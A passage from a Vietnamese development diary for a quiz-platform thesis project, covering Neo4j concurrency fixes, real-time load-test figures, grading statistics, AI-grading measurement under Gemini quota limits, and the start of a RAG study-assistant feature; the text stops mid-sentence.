| Quiz mất bớt chủ đề | `replaceQuizTopics` xoá rồi ghi bằng **hai lần gọi**; lệnh xoá của luồng sau chen vào giữa loạt ghi của luồng trước | Gộp vào **một câu Cypher** dùng `UNWIND` |
| Deadlock Neo4j | Hai luồng giành khoá trên cùng nút Quiz | Thử lại — cách xử lý chuẩn, không phải né bằng khoá to hơn |
| `Cannot run more queries in this transaction` | Vòng lặp thử lại nằm **trong** phương thức `@Transactional`; Neo4j đã huỷ transaction khi deadlock nên lần thử thứ hai chạy trên xác chết | Tách phần đọc sang bean riêng, thử lại **ngoài** transaction |
| `Node already exists with label Quiz` | Hai luồng cùng `MERGE` một nút chưa tồn tại | Bắt cả `DataIntegrityViolationException` rồi thử lại |

Hai điều đáng ghi vào báo cáo:

**`MERGE` không nguyên tử với luồng khác.** Tên gọi khiến người ta tin là "tạo nếu chưa có" một cách
an toàn. Thực tế hai luồng cùng thấy "chưa có" rồi cùng tạo, và ràng buộc duy nhất chặn kẻ tới sau.
Lỗi đó là lỗi *đụng độ* — thử lại được, chứ không phải lỗi dữ liệu.

**Tách đọc khỏi ghi hoá ra là điều kiện để thử lại được.** Ban đầu tách chỉ vì "đừng giữ transaction
JPA mở khi gọi sang Neo4j". Nhưng lý do thật quan trọng hơn: transaction đã chết thì không chạy thêm
được câu nào, nên vòng lặp thử lại **bắt buộc** phải nằm ngoài. Đây cũng là lần thứ ba trong đồ án
vấp cái bẫy `this.method()` không qua proxy Spring — nên lần này tách thành bean riêng ngay từ đầu.

Và một lần nữa, thử lại an toàn **chỉ vì đồng bộ idempotent**.

### Nợ / chuyển sang ngày sau
- ~~Cold start~~ — đã giải bằng nguồn gợi ý thứ ba (chủ đề chưa từng luyện).
- Quiz **chưa ai làm** thì chưa có trong đồ thị nên không được gợi ý — đồ thị xây từ hành vi.
- **FR-36** (LLM giải thích lý do gợi ý) chưa làm: mỗi lần mở trang lại tốn hạn mức AI, cần cache trước.
- **FR-32** adaptive difficulty chưa làm.
- Chưa đo *chất lượng* gợi ý — cần người thật dùng rồi đánh giá, chưa có cách đo tự động.

### Ghi chú báo cáo
- **Mục 1 (tổng quan công nghệ):** đoạn Cypher lọc cộng tác ở trên là lập luận cụ thể nhất cho việc
  vì sao chọn CSDL đồ thị — dùng thay cho những câu chung chung kiểu "Neo4j mạnh về quan hệ".
- **Mục 2.4 (thiết kế CSDL):** bảng "bỏ quan hệ nào, vì sao" — đặc biệt luận điểm *cạnh giữ sự thật,
  truy vấn giữ cách diễn giải*.
- **Mục 2.3:** đồng bộ idempotent giữa hai CSDL, và nguyên tắc CSDL phụ hỏng không kéo sập luồng chính.
- **"Khó khăn & cách giải quyết":** phải cắt bớt bản thiết kế vì hai quan hệ không có nguồn dữ liệu.
  Thà nhận là hệ thống chưa biết còn hơn dựng một lộ trình trông thông minh mà không giải thích được.

---

## 📅 T2 — 10/08/2026 — Đo tải phòng đấu, số liệu mục 3.5

**Mục tiêu:** Một trong hai con số bắt buộc của phiếu giao đề tài. Kế hoạch ghi rõ *"không lùi load
test & đánh giá AI"*, và đây là phần duy nhất làm được ngay vì không đụng hạn mức Gemini.

### Nhiệm vụ
- [x] Viết harness đo độ trễ phát câu hỏi qua STOMP thật
- [x] Chạy thang 10 → 200 người/phòng
- [x] Tách nghẽn: phát tán xuống hay xử lý đáp án lên
- [x] Chứng minh vai trò Redis Pub/Sub bằng hai instance
- [x] Ghi số liệu vào `docs/bao-cao/so-lieu-3.5-hieu-nang-realtime.md`

### Không dùng k6 như kế hoạch — và vì sao thế là đúng

Kế hoạch viết "k6/Gatling". Cả hai **không nói được STOMP over SockJS** nếu không viết thêm
extension, mà thứ cần đo lại chính là đường đó. Harness tự viết dùng đúng thư viện
`@stomp/stompjs` mà trình duyệt dùng, nên nó nói giao thức thật thay vì giả lập.

Điểm hay: **không phải sửa một dòng code nghiệp vụ nào để đo được.** Sự kiện `QUESTION` vốn đã mang
`deadlineAtMillis` cho client đếm ngược; trừ đi thời lượng câu là ra mốc máy chủ phát đi.

### Kết quả

| Người chơi | P50 | P95 | Sự kiện mất |
|---:|---:|---:|---:|
| 10 | 18 ms | 20 ms | 0 |
| 30 | 26 ms | 32 ms | 0 |
| 50 | 48 ms | 52 ms | 0 |
| 100 | 180 ms | 216 ms | 0 |
| 150 | 542 ms | 566 ms | 0 |
| 200 | 1 411 ms | 1 509 ms | 0 |

**Không mất một sự kiện nào ở mọi mức.** Hệ thống không rơi tin nhắn, chỉ chậm dần — kiểu suy giảm
dễ chịu: người chơi thấy câu hỏi tới muộn chứ không ai bị bỏ lại. Ngưỡng thực dụng **100 người/phòng**.

### Con số tổng không nói được nghẽn ở đâu — phải tách ra mới thấy

Ở mức 200 người, P50 (1 411 ms) và P95 (1 509 ms) **gần bằng nhau**. Nếu chậm do phát tán xuống thì
người nhận đầu phải nhanh hơn hẳn người cuối, tức khoảng cách phải rộng. Nó hẹp ⇒ mọi người trễ như
nhau ⇒ nghẽn xảy ra *trước* lúc phát tán.

Kiểm chứng bằng cách chạy lại 200 người **không gửi đáp án**:

| 200 người | P50 | P95 |
|---|---:|---:|
| Có gửi đáp án | 1 411 ms | 1 509 ms |
| Chỉ nhận câu hỏi | **262 ms** | **638 ms** |

**80% độ trễ đến từ xử lý 200 đáp án gửi lên**, không phải phát câu hỏi xuống. Lệnh "câu tiếp" của
chủ phòng phải xếp hàng sau chúng trên cùng một kênh vào.

> Đây là loại kết luận chỉ có được khi **đọc hình dạng phân bố** rồi thiết kế một phép đo để kiểm
> giả thuyết, thay vì nhìn một con số tổng rồi đoán. Nếu tối ưu theo trực giác ban đầu — cải thiện
> phát tán — thì gần như không được gì.

### Vai trò Redis: phiếu bảo "so sánh có/không", nhưng không có chế độ "không"

Kiến trúc cho **mọi** sự kiện đi qua Redis, kể cả tới người chơi trên chính instance vừa phát. Bỏ
Redis không làm chậm hơn — nó làm phòng đấu nhiều instance **không còn tồn tại**.

Chứng minh bằng suy luận loại trừ: chạy hai instance (8080, 8081) dùng chung Redis, chia 40 người
chơi hai bên, host bắt đầu ván trên A.

| Nối vào | Mong đợi | Nhận được | P50 | P95 |
|---|---:|---:|---:|---:|
| A — cùng instance host | 60 | **60** | 38 ms | 41 ms |
| B — instance khác | 60 | **60** | 40 ms | 42 ms |

Hai JVM không có kênh liên lạc nào khác (broker Spring nằm trong bộ nhớ từng instance, PostgreSQL
không phải kênh nhắn tin) ⇒ Redis là con đường duy nhất có thể. **Chi phí của khả năng mở rộng
ngang: khoảng 2 ms.**

### Một lần đo sai suýt thành kết luận sai

Lần chạy đầu báo *"100 người: host không nối được"*, trông như đã chạm giới hạn máy chủ. Thực ra
harness nối host **sau cùng**, khi 100 client trong cùng một tiến trình Node đã làm vòng lặp sự kiện
bận rộn — kết nối cuối chờ quá hạn. Nối host trước là chạy tới 200 người không vấn đề.

> Nếu ghi thẳng "hệ thống chịu được tối đa 50 người" vào báo cáo thì đó là một con số sai, mà lại
> sai theo hướng khiêm tốn nên không ai nghi ngờ. **Công cụ đo cũng là một phần của phép đo.**

### Nợ / chuyển sang ngày sau
- Chưa đo với **mạng thật** — con số hiện tại không gồm độ trễ mạng.
- Chưa đo nhiều phòng chạy song song, chưa đo RAM/CPU.
- Ở mức 200 người, một phần độ trễ có thể là của chính công cụ đo (một tiến trình Node giữ 200
  WebSocket). Muốn tách hẳn thì phải chạy client trên máy khác.
- **Mục 3.6 (độ chính xác AI)** vẫn trống — chờ hạn mức Gemini hồi.

### Ghi chú báo cáo
- **Mục 3.5:** dùng thẳng `docs/bao-cao/so-lieu-3.5-hieu-nang-realtime.md`, đã viết theo đúng khung.
- **Mục 1 (công nghệ):** con số "2 ms cho khả năng mở rộng ngang" là lập luận cụ thể cho việc chọn
  Redis Pub/Sub thay vì gửi thẳng vào broker.
- **"Khó khăn & cách giải quyết":** hai chuyện đáng kể — công cụ đo tự tạo ra một giới hạn giả, và
  việc phải tách phép đo mới tìm đúng nghẽn.

---

## 📅 T2 — 10/08/2026 (chiều) — Lát cắt 9: Thống kê, và món nợ hoá ra to hơn ghi chép

**Mục tiêu:** FR-85 (tiến độ người học) + FR-86 (thống kê cho Creator). Chọn lát cắt này vì nó mở
khoá luôn màn chấm tay mà lát cắt 6 đang nợ.

**Xong:** 5 truy vấn gộp · 3 API thống kê + 1 API đọc bài để chấm · 3 trang frontend · 13 ca test mới ·
hồi quy **251/251** xanh · không cần migration mới.

### Món nợ được ghi sai mức độ

`docs/features/06` ghi: *"Chưa có màn hình cho Creator duyệt danh sách bài cần chấm tay — API đã có,
giao diện chờ features/09."* Đọc câu đó thì tưởng chỉ còn việc vẽ giao diện.

Bắt tay vào làm mới thấy thiếu **cả đường đọc bài**:

```
Creator có:  PATCH /attempts/{a}/answers/{b}/grade   ← ghi điểm
Creator KHÔNG có: cách nào đọc bài làm
GET /attempts/{id} dùng loadOwnAttempt() → Creator nhận 404 (đúng thiết kế)
```

Nghĩa là tính năng chấm tay của lát cắt 6 **chưa bao giờ dùng được**, không phải "thiếu giao diện" mà
là *chấm mà không đọc được bài thì chấm bằng gì*. Test của lát cắt 6 vẫn xanh vì nó gọi PATCH với
`answerId` lấy từ token của **người học** — thứ Creator không có.

> Bài học: nợ kỹ thuật tự ghi thường ghi nhẹ hơn thực tế, vì lúc ghi thì mình đang nhìn từ phía cái
> đã làm được. **Kiểm bằng cách đi trọn một vòng theo vai của người dùng thật** — vào bằng cửa nào,
> bấm gì, đọc gì — chứ không phải điểm danh xem endpoint nào đã có.

Thêm `GET /attempts/{id}/grading`, phạm vi bó đúng bằng mục đích: **chỉ câu tự luận**, chỉ quiz mình
sở hữu. Không dùng lại `AttemptDetailResponse` — đó là màn hình *người học xem bài mình làm*, có đáp
án đúng và lời giải. Một DTO phục vụ hai vai thì mỗi lần thêm trường lại phải nghĩ "trường này ai
được thấy", và sẽ có lần nghĩ sai.

Cũng phải sửa javadoc của `AttemptService`: nó khẳng định *"kể cả chủ quiz cũng không đọc được bài làm
của người khác qua các API này"* — sau thay đổi này câu đó thành sai. Tài liệu nói sai về bảo mật
nguy hiểm hơn không nói gì, vì người đọc sau sẽ tin nó mà không kiểm.

### Ba chỗ số liệu dễ ra kết quả sai — và vì sao chúng khó thấy

Đặc điểm chung: **không có cái nào làm hệ thống báo lỗi.** Nó chỉ cho ra một con số trông hợp lý.

| Chỗ sai | Nếu làm sai thì thấy gì |
|---|---|
| Trả `0` khi chưa có dữ liệu | Người chưa làm bài nào hiện *"điểm trung bình 0%"* — trông như học sinh kém nhất lớp |
| Tính câu `PENDING_AI`/`AI_FAILED` là câu sai | **Câu tự luận nào cũng thành câu khó nhất đề**, Creator đi sửa một câu hỏi không có vấn đề gì |
| Không lọc câu quá ít lượt trả lời | Câu sai 1/1 lượt hiện *"tỉ lệ sai 100%"*, đứng đầu bảng câu khó |

Chỗ thứ hai là chính lỗi đã mắc khi đo mục 3.6 hôm trước (gộp *"AI chấm 0 điểm"* với *"AI không
chạy"*). Lần này biết trước nên viết `graded_by in (AUTO, AI, HUMAN)` ngay từ câu truy vấn đầu, và
thêm một ca test riêng để nó không quay lại.

Chỗ thứ ba dùng đúng ngưỡng **3 lượt** của features/07 — cùng một câu hỏi "bao nhiêu dữ liệu mới đủ
để kết luận", nên không có lý gì mỗi chỗ trả lời một kiểu.

### Ô nhập điểm để trống, không điền sẵn 0

Câu `AI_FAILED` có `score = 0` trong CSDL. Điền 0 vào ô nhập là mớm cho người chấm một con số **vô
nghĩa** — 0 ở đó là giá trị mặc định của cột, không phải kết luận về bài làm — rồi họ bấm lưu và bài
thành 0 điểm thật. Để trống thì nút Lưu bị chặn tới khi có người thực sự quyết định.

Cùng lý do, bảng bài làm ghi *"chưa phải điểm cuối"* dưới điểm của bài còn câu chờ chấm.

### Hai lỗi trong test của chính mình

Chạy lần đầu 2/13 đỏ, **cả hai đều là lỗi fixture, không phải lỗi code**:

- `shouldScopeProgressToCaller` dùng tài khoản fixture chung → tài khoản đó đã có bài từ ca chạy
  trước, điểm trung bình 25% thay vì 100%. Đúng cái bẫy đã gặp ở test Neo4j: **chạy lẻ thì đạt, chạy
  cả bộ thì hỏng**. Sửa bằng tài khoản riêng cho ca đó.
- Kỳ vọng điểm 8 trong khi thực tế 7 — tôi copy fixture từ test lát cắt 6 (câu trắc nghiệm 2 điểm)
  nhưng ở đây câu Đúng/Sai chỉ 1 điểm.

Không có lỗi nào của phần code chính. Điều đó không có nghĩa là test vô ích: nó chứng minh
`left join a.answers` không nhân đôi số dòng, phân bố điểm đủ 10 khoảng, bài 100% rơi vào khoảng cuối
chứ không tạo khoảng thứ mười một, và quiz người khác trả 404 — những thứ chỉ CSDL thật kiểm được.

### Quyết định phạm vi

- **FR-87 (xuất PDF) bỏ.** Mức [C] Could, và nó chỉ đóng gói lại đúng số liệu đã có trên màn hình.
  Đổi lấy một thư viện sinh PDF kèm bộ font tiếng Việt riêng thì không xứng.
- **Điểm mạnh/yếu theo chủ đề KHÔNG làm lại ở đây** dù FR-85 có nhắc. Phần đó đã ở trang Lộ trình,
  tính từ Neo4j. Tính lại từ PostgreSQL sẽ có hai màn hình nói cùng một chuyện bằng hai cách trên hai
  kho dữ liệu — khớp nhau hôm nay, lệch nhau vào ngày ai đó sửa một trong hai công thức, và lúc đó
  không có cách nào biết màn nào đúng. Trang Tiến độ dẫn sang trang Lộ trình.
- **Không thêm migration.** Mọi số liệu suy ra được từ bảng đã có; bảng tổng hợp sẵn chỉ đáng làm khi
  truy vấn thật sự chậm, mà nó chưa chậm.
- **Biểu đồ viết tay** bằng SVG + CSS. Thư viện biểu đồ nhẹ nhất cũng nặng hơn cả tính năng này và
  mang theo bảng màu riêng đi ngược hệ thống giao diện.

### Còn lại / rủi ro
- **Mục 3.6 vẫn trống** — chờ hạn mức Gemini hồi. Không liên quan tới lát cắt này.
- Trong CSDL dev còn **5 tài khoản + 7 quiz rác** từ kịch bản đo mục 3.6 (`danhgia-*`,
  `hai-instance-*`). Chưa xoá vì đang chờ đo lại; xoá sau khi mục 3.6 xong.
- Chưa xem thật trên trình duyệt — build và test xanh **không** đồng nghĩa với trang chạy được.

### Ghi chú báo cáo
- **Chương 2 (phân tích thiết kế):** lấy bảng "ba chỗ số liệu dễ ra kết quả sai" làm ví dụ cho việc
  *ràng buộc dữ liệu nằm ở tầng truy vấn*, không phải ở giao diện.
- **"Khó khăn & cách giải quyết":** món nợ tự ghi nhẹ hơn thực tế — kiểm nợ bằng cách đi trọn một
  vòng theo vai người dùng, không phải điểm danh endpoint.
- **Mục 3.4 (kiểm thử):** 251 ca, trong đó lát cắt 9 thêm 13 ca. Nêu rõ vì sao dùng PostgreSQL thật
  thay vì mock repository.

---

## 📅 T2 — 10/08/2026 (tối) — Ba lỗi chỉ lộ ra khi chạy thật, và một cái nằm trong bộ test

**Mục tiêu:** Xem lát cắt 9 trên trình duyệt trước khi tạo PR. Không lỗi nào dưới đây bị build hay
257 ca test bắt được.

### Chuỗi truy vết bắt đầu từ một câu hỏi rất đơn giản

Ảnh chụp màn hình kèm câu *"phần này ảnh đâu"* — thẻ ở khu Gợi ý không có ảnh bìa. Kéo sợi chỉ đó ra
được ba lỗi xếp chồng, mỗi lỗi lộ ra sau khi sửa lỗi trước.

**Lỗi 1 — thẻ gợi ý đọc dữ liệu hiển thị từ bản sao trong Neo4j.**
Không phải quên thêm một trường. Tiêu đề đang lấy từ nhãn trên nút đồ thị, mà đồ thị chỉ đồng bộ khi
có bài nộp mới → chủ quiz đổi tên xong thì thẻ còn hiện tên cũ rất lâu. Nhân bản thêm ảnh bìa sang đó
sẽ hỏng nặng hơn: đổi ảnh thì thẻ trỏ vào file đã xoá. Sửa theo hướng ngược lại — **Neo4j chỉ cho ID
và lý do gợi ý, mọi thứ để hiển thị đọc từ PostgreSQL** bằng một truy vấn cho cả danh sách.

**Lỗi 2 — nút rác ăn mất chỗ.** Do chính bản sửa ở trên đẻ ra: bộ lọc quiz-đã-xoá chạy *sau* khi
danh sách đã cắt theo `limit`. Đồ thị còn 4 nút rác thì cả 4 chỗ bị chiếm rồi mới lọc → danh sách
rỗng. Đúng lỗi "khám phá không hiện gì" đã gặp, chỉ đổi nguyên nhân.

> Viết test xong tôi **tạm bỏ bản sửa rồi chạy lại**: đỏ thật, `4 → 2`. Test mà xanh cả khi có lỗi
> thì không canh gì cả — và bước kiểm này chỉ tốn một phút.

**Lỗi 3 — khu Gợi ý im lặng biến mất.** Xem mục dưới.

### Rỗng vì đã làm hết ≠ rỗng vì hỏng

Sau khi dọn dữ liệu rác, khu Gợi ý vẫn trống. Soi thẳng vào đồ thị mới rõ: người dùng **đã làm hết**
cả 5 quiz có câu hỏi, nên cả ba nguồn cạn cùng lúc. **0 gợi ý là câu trả lời đúng.**

Nhưng giao diện ẩn hẳn khu đó, nên không phân biệt được với "hỏng" — và thực tế đã hiểu nhầm thành
hỏng **hai lần**. Thiết kế ban đầu ẩn nó với lý do *"người mới thấy ô trống thì tưởng hệ thống hỏng"*;
lập luận đúng cho người mới, nhưng ẩn đi lại tạo ra đúng nỗi nghi đó theo đường khác.

`/recommendations` đổi sang `{ items, note }` giống `/path` vốn đã vậy. Ba tình huống rỗng, ba việc
người dùng nên làm khác nhau nên không gộp một câu. Tình huống thứ ba là **lỗi im lặng có sẵn từ
trước**: Neo4j hỏng thì lỗi bị nuốt và trả rỗng — đúng, nhưng nuốt xong không nói gì nên trông y hệt
lúc đã làm hết quiz.

### Bộ test xoá sạch đồ thị của máy dev

Lỗi đáng kể nhất trong ngày, và tôi suýt đổ oan cho code gợi ý.

PostgreSQL với Redis đã an toàn nhờ Testcontainers, nhưng **11 lớp test khởi động cả ứng dụng mà
không khai báo `Neo4jContainer`**. Thiếu container thì cấu hình rơi về mặc định `bolt://localhost:7687`
— đúng Neo4j dev đang chạy bằng `docker compose`. Rồi:

```
Test khởi động Spring context
  → GraphSchemaInitializer → syncPublicCatalog()
  → pruneDeleted(id hợp lệ lấy từ PostgreSQL CỦA TEST — gần như rỗng)
  → XOÁ mọi nút không có trong đó = toàn bộ đồ thị dev
```

Đo thật thay vì suy đoán: cắm một nút mốc vào Neo4j dev, chạy **đúng một ca test chỉ kiểm mã 401**.

| | Số nút còn lại |
|---|---|
| Trước bản sửa | `0 users, 0 quizzes` — mất sạch |
| Sau bản sửa | nút mốc còn nguyên, 5 quiz nguyên vẹn |

Sửa bằng `systemPropertyVariables` của surefire, trỏ `spring.neo4j.uri` vào cổng không ai nghe.
**Không** dùng `src/test/resources/application.yml`: file đó *che hẳn* `application.yml` của `main`
chứ không gộp vào — thử và hỏng ngay ở placeholder `app.ai.gemini.model`. Mất thêm một lượt nữa mới
nhận ra `target/test-classes/application.yml` vẫn còn bản sao cũ sau khi đã xoá ở `src`.

> Ba bài học, tách bạch:
> 1. **Testcontainers chỉ bảo vệ những gì mình khai báo.** Thiếu một dịch vụ là test lặng lẽ dùng bản
>    thật, và lỗ thủng đó không báo gì cả.
> 2. **Triệu chứng không trỏ đúng thủ phạm.** "Khu Gợi ý trống" chỉ về phía code gợi ý; thủ phạm nằm
>    ở cấu hình test. Phân biệt được là nhờ **đo trước/sau**, không phải nhờ đọc code.
> 3. **Xoá file nguồn không xoá bản đã build.** `rm src/...` xong vẫn hỏng vì `target/test-classes`
>    còn bản cũ.

### Kỷ luật giữ sạch CSDL dev

Hai lần cần token thật để kiểm chứng, tôi tạo tài khoản tạm rồi **xoá ngay sau khi đo xong**, kiểm
lại `count(*) where email like '%@example.com'` về 0. Chính đống rác từ kịch bản đo hôm trước (18 tài
khoản, 21 quiz) đã làm khu Gợi ý toàn quiz "Quiz đo tải 3mqtrf" — công cụ kiểm chứng mà không tự dọn
thì nó thành dữ liệu bẩn của ngày hôm sau.

### Ghi chú báo cáo
- **Mục 3.4 (kiểm thử):** dùng chuyện "bộ test xoá đồ thị dev" làm ví dụ cho việc *cô lập môi trường
  test* — và cho việc test xanh không đồng nghĩa với test đúng.
- **"Khó khăn & cách giải quyết":** ba lỗi xếp chồng, mỗi cái chỉ lộ ra sau khi sửa cái trước; và
  cách phân biệt "rỗng đúng" với "rỗng do hỏng".
- **Chương 2:** `{ items, note }` thay cho mảng trần là ví dụ cụ thể cho nguyên tắc *API phải nói
  được vì sao không có dữ liệu*.

---

## 📅 T2 — 10/08/2026 (đêm) — Chuẩn bị đo mục 3.6, và kết luận về Grok

**Mục tiêu:** Con số bắt buộc cuối cùng của phiếu. Không xong được hôm nay, nhưng gỡ được ba chướng
ngại và sửa hai lỗi thật.

### Phép đo tự đốt hạn mức nó cần để chạy

Kịch bản đo đầu tiên bắn 8 bài chấm liên tiếp. Mỗi bài dính 429 rồi **thử lại 4 lần** → một bài hỏng
tiêu 4 lượt. 8 bài × 4 = tới 32 lượt, trong khi hạn mức ngày của Gemini miễn phí chỉ **20**.

Sửa hai chỗ:
- Giãn nhịp **70 giây giữa các lượt** (hạn mức là 5 lượt/phút).
- Cho số lần thử lại **đọc từ cấu hình** thay vì hằng số cứng, để phiên đo đặt về 1:
  `--app.ai.max-attempts-background=1`.

> Bài học: **phép đo tiêu tài nguyên giống như tải thật.** Chính sách thử lại thiết kế cho "job nền
> chờ lâu không phiền ai" trở thành có hại khi tài nguyên giới hạn theo ngày chứ không theo phút.

### Lỗi đo suýt vào báo cáo

Lần chạy đầu in ra:

```
Đủ 3 ý, diễn đạt rõ    AI 0/10 · chuẩn 9–10 · LỆCH 9
```

Bài trả lời **đầy đủ, chính xác** mà 0 điểm. Nếu tin con số này thì báo cáo sẽ ghi *"AI chấm sai hoàn
toàn, sai lệch trung bình 6/10"* — trong khi thực tế **AI chưa từng được gọi**. Trạng thái `AI_FAILED`
cũng để cột `score` bằng 0, và kịch bản đọc thẳng cột đó.

Sửa: bài nào `gradedBy != AI` bị **loại khỏi thống kê**, không tính là 0 điểm, và in rõ "không đo
được" kèm lý do.

> Gộp *"AI chấm 0 điểm"* với *"AI không chạy"* làm hỏng chính con số đang đo — và nó sẽ trôi vào báo
> cáo mà không ai phát hiện, vì con số trông có vẻ hợp lý.

### Chốt về Grok: không có gói miễn phí

Ý hay từ phía người dùng: kiến trúc đã có fallback Gemini→Grok, vậy dùng Grok để vượt hạn mức Gemini.
Đúng về nguyên tắc — và giải luôn chỉ số fallback của mục 3.6.

Thử thật với key xAI mới tạo:

| Thử | Kết quả |
|---|---|
| `/v1/chat/completions` + `grok-2` | `Model not found: grok-2` |
| `/v1/chat/completions` + `grok-4.5` | `permission-denied: team doesn't have any credits` |
| `/v1/responses` + `grok-4.5` (đúng mẫu console) | `permission-denied` |
| `/v1/models` | `permission-denied` |

Hai kết luận riêng biệt, đừng lẫn:

1. **`grok-2` đã bị xAI gỡ** — cấu hình đang trỏ vào model không tồn tại. Đây là lỗi thật, độc lập
   với chuyện tiền: dù có tín dụng, fallback vẫn hỏng vì sai tên. Đã sửa sang `grok-4.5`.
2. **xAI không có gói miễn phí.** Key hợp lệ, ký đúng, nhưng team chưa nạp tín dụng thì bị chặn ở
   tầng quyền trước khi tới model.

Lỗi đầu che lỗi sau: `Model not found` xuất hiện trước `permission-denied` vì xAI kiểm tên model
trước khi kiểm quyền. Sửa tên model mới lộ ra rào chặn thật là tiền — nên tôi đã kết luận sớm một lần
rồi phải nói lại.

### Vì sao KHÔNG điền key vào `.env` dù đã có

Điền key của team không tín dụng **tệ hơn để trống**:

```
Gemini hết hạn mức (429 — lỗi TẠM THỜI)
   → chuyển sang Grok
   → Grok trả 403 (lỗi KHÔNG tạm thời)
   → dừng, ném lỗi của Grok ra ngoài
```

Người dùng đang nhận *"hết hạn mức, chờ 52 giây"* — thông báo hữu ích — sẽ nhận thành *"permission
denied"*. Để trống thì `AiOrchestrator` lọc Grok ra ngay từ đầu và thông báo giữ nguyên đúng.

Cũng sửa một câu **sai sự thật** trong `tech-stack.md`: dòng mô tả Grok ghi *"Gói miễn phí"*. Không
đúng, và nếu để nguyên thì báo cáo sẽ khẳng định một điều kiểm chứng được là sai.

### Quyết định: không nạp tiền cho fallback

Fallback là mức **[S] Should**, không phải Must. Bỏ nó không ảnh hưởng bốn trụ cột MVP. Mục 3.6 vẫn
đo được ba trên bốn chỉ số bằng Gemini.

Trong báo cáo ghi đúng thực tế: *"Cơ chế fallback đã hiện thực và có test tự động che phủ; chưa đo
được thời gian chuyển thật vì xAI không cung cấp gói miễn phí."* Giới hạn nêu thật, có lý do kiểm
chứng được — hơn hẳn một con số bịa cho đủ bảng.

### Kế hoạch mục 3.6 (mai, khi hạn mức Gemini hồi)

| Chỉ số | Đo được? | Cách đo |
|---|---|---|
| Chất lượng sinh đề | ✅ | % câu qua bộ kiểm duyệt cấu trúc, 2 chủ đề × 5 câu |
| Độ chính xác chấm tự luận | ✅ | Sai lệch điểm so với **đáp án theo rubric** trên 6 bài mẫu |
| Chống prompt injection | ✅ | 2 bài tấn công trong cùng bộ mẫu (đã có kết quả sơ bộ 3/3 chặn được) |
| Thời gian chuyển Gemini→Grok | ❌ | xAI không có gói miễn phí |

Lệnh chạy: khởi động backend với `--app.ai.max-attempts-background=1` rồi
`node danhgia_ai.mjs` — khoảng 12 phút, tiêu ~10 lượt trong hạn mức 20.

### Ghi chú báo cáo
- **Mục 3.6:** nói rõ đối chiếu với **đáp án theo rubric**, chưa phải với người chấm thật. Rubric
  quyết định điểm nên "đúng" là thứ suy ra được từ tiêu chí, không phải ý kiến của người viết kịch bản.
- **"Khó khăn & cách giải quyết":** hai chuyện đáng kể — phép đo tự đốt hạn mức, và việc gộp
  "AI chấm 0" với "AI không chạy" làm hỏng số liệu.
- **Mục 1 (công nghệ):** lý do thực tế cho việc chọn hai provider nhưng chỉ chạy một, và giới hạn
  của gói miễn phí ảnh hưởng tới thiết kế thế nào.

---

## 📅 T3 — 11/08/2026 — Lát cắt 8: Trợ lý học tập RAG, và ba lỗi chỉ máy thật mới lộ

**Mục tiêu:** FR-31 — tính năng mức [M] **cuối cùng** còn thiếu của phiếu giao đề tài. Trước hôm nay
tôi từng kết luận nhầm rằng phần bắt buộc đã đóng sau mục 3.6; đọc lại `features/README.md` mới thấy
08 vẫn là [M] và `api.md` còn đánh dấu ⏳.

**Xong:** migration V10 · streaming SSE thật · 4 API chat · công tắc chia sẻ học liệu · trang
`/assistant` · 17 ca test mới + 6 ca cho kho vector.

### Đặc tả đòi một thứ dữ liệu không đỡ được

`features/08` viết *"Learner hỏi khái niệm → nhận giải thích bám học liệu"*. Nhưng:

| Sự thật trong code | Hệ quả |
|---|---|
| `learning_materials` chỉ có `owner_id`, không liên kết quiz, không cờ công khai | học liệu là tài sản riêng của Creator |
| truy vấn vector lọc `where m.owner_id = ?` | truy vấn người này không lôi được tài liệu người khác |
| `AiController` gắn `@PreAuthorize` CREATOR/ADMIN cấp lớp | Learner không chạm được khu học liệu |

Learner **không sở hữu học liệu nào**, nên chatbot của họ sẽ truy xuất được **con số không** — và mô
hình trả lời bằng kiến thức nền, tức là bịa. Đây không phải bất tiện nhỏ mà là lỗ hổng ở gốc: bịa
chính là thứ RAG sinh ra để chống.

Hỏi ý người hướng dẫn dự án trước khi code, chọn phương án nhỏ nhất giải quyết được: thêm cột
`learning_materials.shared`, mặc định **false**. Không mở mặc định vì tài liệu tải lên trước khi có
tính năng này thì chủ của chúng chưa từng đồng ý chia sẻ.

> Bài học: **đặc tả có thể mâu thuẫn với schema mà không ai nhận ra**, cho tới khi có người thật sự
> đi hết một luồng. Chỗ để phát hiện là lúc đọc dữ liệu, không phải lúc đọc yêu cầu.

### Ba lỗi chỉ lộ ra khi chạy thật

Không lỗi nào làm hỏng build; hai lỗi đầu còn không lỗi test nếu không cố tình đi tìm.

**1. Spring Security giết luồng SSE ngay lần chạy đầu.**

```
Unable to handle the Spring Security Exception because the response is already committed
```

Nhịp dispatch `ASYNC` là phần tiếp của request đã qua kiểm quyền, nhưng bộ lọc JWT kế thừa
`OncePerRequestFilter` nên cố tình không chạy lại → `SecurityContext` trống → request bị chặn **giữa
luồng**, lúc header đã gửi đi rồi. Mọi endpoint SSE đều chết. Sửa bằng
`dispatcherTypeMatchers(ASYNC).permitAll()`.

**2. Mảnh token mất khoảng trắng đầu — chữ dính vào nhau.**

Chuẩn SSE quy định client bỏ *một* khoảng trắng đứng ngay sau `data:`, mà mảnh của Gemini rất thường
bắt đầu bằng space. Đo thật khi gửi chuỗi thô:

```
Gửi:  "Vòng lặp" " for" " dùng" " khi" " biết" " trước"
Nhận: "Vòng lặpfordùngkhibiếttrước"
```

Bọc mảnh trong JSON `{"t":"…"}` là hết. Tôi **tạm bỏ bản sửa rồi chạy lại test** để chắc nó canh đúng
chỗ — đỏ thật.

**3. Nhánh `materialId = null` của truy vấn vector lặng lẽ trả rỗng — lỗi có từ lát cắt 5.**

Đây là lỗi nặng nhất trong ngày. Câu SQL viết `(cast(? as uuid) is null or m.id = cast(? as uuid))`
rồi truyền `null` vào. Đo trên PostgreSQL thật, cùng một câu hỏi:

| Tham số | Kết quả |
|---|---|
| `materialId` cụ thể | **1 đoạn**, khoảng cách 0.238 |
| `materialId = null` | **0 đoạn** |

Không lỗi, không cảnh báo — chỉ là kho vector coi như rỗng. Và nhánh `null` đúng là nhánh cả hai tính
năng RAG dùng nhiều nhất:

- Trợ lý trả lời *"tài liệu không đề cập"* dù kho đầy tài liệu đúng chủ đề.
- **Sinh đề (features/05)** với `useMaterials = true` nhưng không chọn tài liệu cụ thể thì không có
  ngữ cảnh nào → mô hình sinh câu hỏi từ kiến thức nền của nó. Tức là trụ cột RAG của đề tài đã hỏng
  ở một nhánh mà không ai biết, vì kết quả vẫn ra câu hỏi trông hợp lý.

Sửa bằng cách ghép điều kiện ở Java thay vì truyền `null` vào SQL, và thêm hẳn
